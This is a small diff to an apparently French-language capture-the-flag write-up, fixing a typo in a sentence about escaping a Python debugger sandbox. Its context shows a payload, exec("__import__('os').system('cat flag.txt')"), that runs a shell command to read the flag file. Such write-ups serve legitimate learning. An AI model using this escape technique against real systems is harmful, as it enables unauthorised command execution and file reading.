@@ -106,7 +106,7 @@ exec  pdb
 (Pdb)
 ```
 
-> Je vois que j'ai accès à **exec** alors je mets génère un payload : 
+> Je vois que j'ai accès à **exec** alors je me génère un payload : 
 
 ```python
 exec("__import__('os').system('cat flag.txt')")
